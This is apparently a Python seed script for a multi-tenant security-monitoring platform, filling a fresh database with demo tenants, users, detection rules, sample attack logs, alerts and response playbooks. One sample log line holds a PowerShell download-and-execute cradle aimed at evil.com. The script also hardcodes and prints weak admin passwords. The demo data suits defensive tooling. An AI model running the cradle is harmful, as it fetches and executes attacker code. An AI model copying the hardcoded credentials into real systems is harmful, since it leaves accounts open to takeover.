"""
Multi-tenant seed: creates super admin + 2 demo client tenants.
Run once: python seed_multitenant.py
"""

import random, secrets
from datetime import datetime, timezone, timedelta
from core.database import engine, SessionLocal, Base
from core.models import *
from core.auth import hash_password

Base.metadata.drop_all(bind=engine)
Base.metadata.create_all(bind=engine)

db = SessionLocal()

# ─── Super Admin (no tenant) ──────────────────────────────────────────────────
super_admin = User(
    tenant_id=None,
    username="superadmin",
    email="superadmin@cybernest.platform",
    hashed_password=hash_password("SuperAdmin123!"),
    role=UserRole.SUPER_ADMIN,
)
db.add(super_admin)
db.flush()
print(f"✓ Super admin: superadmin / SuperAdmin123!")

# ─── Tenant 1: Acme Corp ──────────────────────────────────────────────────────
t1 = Tenant(slug="acme-corp", name="Acme Corporation", plan=TenantPlan.BUSINESS)
db.add(t1)
db.flush()

u1_admin = User(tenant_id=t1.id, username="acme.admin", email="admin@acme.com",
                hashed_password=hash_password("AcmeAdmin123!"), role=UserRole.TENANT_ADMIN)
u1_analyst = User(tenant_id=t1.id, username="acme.analyst", email="analyst@acme.com",
                  hashed_password=hash_password("AcmeAnalyst123!"), role=UserRole.ANALYST)
db.add_all([u1_admin, u1_analyst])

# Sources for Acme
for name, stype, host in [
    ("Web Server", "syslog", "10.0.1.10"),
    ("DB Server", "agent", "10.0.1.20"),
    ("Firewall", "syslog", "10.0.1.1"),
]:
    db.add(LogSource(tenant_id=t1.id, name=name, source_type=stype, host=host))
db.flush()

# Detection rules for Acme (seeded from YAML templates)
import yaml, pathlib
rules_dir = pathlib.Path(__file__).parent.parent / "config" / "rules"
for rf in sorted(rules_dir.glob("*.yml")):
    docs = list(yaml.safe_load_all(open(rf)))
    for doc in docs:
        if doc:
            db.add(DetectionRule(
                tenant_id=t1.id, name=doc.get("name", ""),
                description=doc.get("description", ""),
                severity=Severity(doc.get("severity", "medium")),
                enabled=True,
                logic={"conditions": doc.get("conditions", []), "logic": doc.get("logic", "or")},
                mitre_tactic=doc.get("mitre_tactic"), mitre_technique=doc.get("mitre_technique"),
            ))
db.flush()

# Events for Acme
DEMO_LOGS = [
    'Mar 15 10:23:45 web-srv-01 sshd[12345]: Failed password for root from 185.220.101.34 port 22 ssh2',
    'CEF:0|CyberNest|IDS|1.0|100|Suspicious Outbound|8|src=192.168.1.25 dst=45.33.32.156 dpt=4444',
    'Mar 15 10:31:22 dev-ws-04 powershell: IEX(New-Object Net.WebClient).DownloadString("http://evil.com/payload")',
    'Mar 15 10:32:15 hr-ws-12 svchost: mass file rename in C:\\Users\\jdoe\\Documents - possible ransomware',
    'Mar 15 10:33:01 db-srv-02 sudo: authentication failure; logname=www-data uid=33',
    'Mar 15 10:34:00 dc-01 EventLog: New admin account "backdoor_admin" created by SYSTEM',
    'Mar 15 10:38:22 app-srv-03 kernel: TCP SYN scan from 198.51.100.23 - 500 ports in 10s',
]
ips = ["185.220.101.34","91.219.236.222","45.33.32.156","198.51.100.23","10.0.0.5"]
hosts = ["web-srv-01","db-srv-02","app-srv-03","dc-01","mail-srv-01"]

for i in range(80):
    log = DEMO_LOGS[i % len(DEMO_LOGS)]
    db.add(Event(
        tenant_id=t1.id,
        timestamp=datetime.now(timezone.utc) - timedelta(hours=random.randint(0,48)),
        raw_log=log, parsed={}, severity=random.choice(list(Severity)),
        category=random.choice(["syslog","cef","auth","network"]),
        src_ip=random.choice(ips), hostname=random.choice(hosts),
        message=log[:200],
    ))
db.flush()

# Alerts
ALERT_TITLES = [
    ("Brute Force Attack from 185.220.101.34", Severity.HIGH),
    ("Suspected C2 Communication to 45.33.32.156", Severity.CRITICAL),
    ("Suspicious PowerShell Activity on dev-ws-04", Severity.CRITICAL),
    ("Port Scan from 198.51.100.23", Severity.MEDIUM),
    ("New Admin Account Created on dc-01", Severity.HIGH),
]
for title, sev in ALERT_TITLES:
    db.add(Alert(
        tenant_id=t1.id, severity=sev, status=random.choice(list(AlertStatus)),
        title=title, description=f"Detected: {title}",
        ioc_data={"src_ip": random.choice(ips)}, source_event_ids=[],
        created_at=datetime.now(timezone.utc) - timedelta(hours=random.randint(0,24)),
    ))

# Playbooks
PLAYBOOKS = [
    ("Block Malicious IP", "alert", [
        {"name": "Log Detection", "action": "log", "params": {"message": "Malicious IP {{src_ip}} detected"}},
        {"name": "Enrich IOC", "action": "enrich_ioc", "params": {"ioc": "{{src_ip}}"}},
        {"name": "Block IP", "action": "block_ip", "params": {"ip": "{{src_ip}}"}, "on_failure": "abort"},
        {"name": "Notify SOC", "action": "send_notification", "params": {"channel": "slack", "message": "Blocked IP: {{src_ip}}", "severity": "high"}},
        {"name": "Create Ticket", "action": "create_ticket", "params": {"title": "Blocked Malicious IP: {{src_ip}}"}},
    ]),
    ("Brute Force Response", "alert", [
        {"name": "Enrich IP", "action": "enrich_ioc", "params": {"ioc": "{{src_ip}}"}},
        {"name": "Block if Malicious", "action": "block_ip", "params": {"ip": "{{src_ip}}"}, "condition": "{{ioc_verdict}} == 'malicious'"},
        {"name": "Create Incident", "action": "create_ticket", "params": {"title": "Brute Force from {{src_ip}}"}},
        {"name": "Notify Team", "action": "send_notification", "params": {"channel": "slack", "message": "Brute force detected from {{src_ip}}", "severity": "high"}},
    ]),
    ("Isolate Infected Host", "manual", [
        {"name": "Log Action", "action": "log", "params": {"message": "Isolating host {{hostname}}"}},
        {"name": "Isolate Host", "action": "isolate_host", "params": {"hostname": "{{hostname}}"}},
        {"name": "Notify SOC", "action": "send_notification", "params": {"channel": "slack", "message": "Host {{hostname}} isolated", "severity": "critical"}},
        {"name": "Create Ticket", "action": "create_ticket", "params": {"title": "Host Isolation: {{hostname}}"}},
    ]),
]
for name, trigger, steps in PLAYBOOKS:
    db.add(Playbook(tenant_id=t1.id, name=name, trigger_type=trigger, steps=steps, enabled=True,
                    description=f"Automated response: {name}"))

# Incidents
for title, sev, status in [
    ("Active SSH Brute Force Campaign", Severity.HIGH, IncidentStatus.IN_PROGRESS),
    ("Suspected C2 Beacon on dev-ws-04", Severity.CRITICAL, IncidentStatus.OPEN),
    ("Ransomware Activity on hr-ws-12", Severity.CRITICAL, IncidentStatus.CONTAINED),
]:
    db.add(Incident(
        tenant_id=t1.id, title=title, severity=sev, status=status,
        assigned_to="acme.analyst",
        timeline=[{"action": "created", "timestamp": datetime.now(timezone.utc).isoformat(), "details": title}],
    ))

db.commit()
print(f"✓ Tenant 1: acme-corp | admin: acme.admin/AcmeAdmin123! | token: {t1.ingest_token}")

# ─── Tenant 2: TechStart Inc ──────────────────────────────────────────────────
t2 = Tenant(slug="techstart", name="TechStart Inc", plan=TenantPlan.STARTER)
db.add(t2)
db.flush()
u2 = User(tenant_id=t2.id, username="techstart.admin", email="admin@techstart.io",
          hashed_password=hash_password("TechStart123!"), role=UserRole.TENANT_ADMIN)
db.add(u2)
for name, stype, host in [("App Server", "agent", "172.16.0.10"), ("VPN Gateway", "syslog", "172.16.0.1")]:
    db.add(LogSource(tenant_id=t2.id, name=name, source_type=stype, host=host))
for i in range(20):
    db.add(Event(tenant_id=t2.id, timestamp=datetime.now(timezone.utc) - timedelta(hours=i),
                 raw_log=DEMO_LOGS[i % len(DEMO_LOGS)], parsed={}, severity=Severity.LOW,
                 category="syslog", src_ip="10.10.0.1", message="sample"))

db.commit()
print(f"✓ Tenant 2: techstart | admin: techstart.admin/TechStart123! | token: {t2.ingest_token}")

db.close()

print("\n" + "="*60)
print("  CyberNest — Multi-Tenant Seed Complete")
print("="*60)
print(f"  Platform admin: superadmin / SuperAdmin123!")
print(f"  Tenant 1 admin: acme.admin / AcmeAdmin123!")
print(f"  Tenant 2 admin: techstart.admin / TechStart123!")
print(f"\n  Acme ingest token: {t1.ingest_token}")
print(f"  TechStart ingest token: {t2.ingest_token}")
print("\n  Device log submission:")
print("  POST /api/v1/ingest/event")
print("  Header: X-Ingest-Token: <token>")
print("  Body:   {\"raw_log\": \"<your log line>\"}")
print("="*60)
